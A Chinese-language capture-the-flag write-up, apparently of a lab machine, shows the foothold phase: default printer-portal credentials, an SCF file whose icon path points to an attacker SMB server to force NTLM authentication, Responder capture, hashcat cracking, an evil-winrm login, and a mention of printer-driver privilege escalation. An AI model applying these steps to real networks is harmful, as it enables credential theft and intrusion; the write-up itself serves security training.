Phase 1

立足点：SCF 文件强制认证

默认凭据 admin:admin 登录 MFP Firmware Update Center。上传功能说明文件会被放到 SMB 共享，测试团队手动审核。

🧒 儿童版 — 图标陷阱钓密码SCF 文件是 Windows 的特殊文件。资源管理器打开包含 .scf 文件的文件夹时，会自动加载 SCF 里指定的图标路径。图标路径指向我们的 SMB 服务器 → Windows 自动发送 NTLM 哈希来认证。受害者甚至不需要"打开"文件，只需要浏览到文件夹就触发。
# 1. 开启 Responder 监听
$ sudo responder -w -I tun0

# 2. 制作恶意 SCF 文件
[Shell]
Command=2
IconFile=\\10.10.14.152\tools\nc.ico
[Taskbar]
Command=ToggleDesktop

# 3. 通过 fw_up.php 上传，等待管理员浏览

# 4. Responder 捕获 NTLMv2
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:...

# 5. 破解
$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
liltony

# 6. WinRM 登录
$ evil-winrm -u tony -p 'liltony' -i 10.129.2.142
*Evil-WinRM* PS > cat user.txt
d14daa97b79f86390d8ea695c95a19f2

知识点总结

SCF/LNK/URL 文件强制认证：零点击攻击。

受害者只需浏览文件夹就会发送 NTLM 哈希。用 Responder 监听，hashcat -m 5600 破解 NTLMv2。

PowerShell 历史记录 = ConsoleHost_history.txt。

渗透必查文件。经常暴露安装命令、凭据、内部工具。

RICOH 打印驱动提权。

与 PrintNightmare 同一类攻击面——Windows 打印后台处理程序的驱动加载机制。必须先 migrate 到稳定交互式进程。

SCF 强制认证 → NTLMv2→hashcat → WinRM→RICOH 驱动提权 → SYSTEM
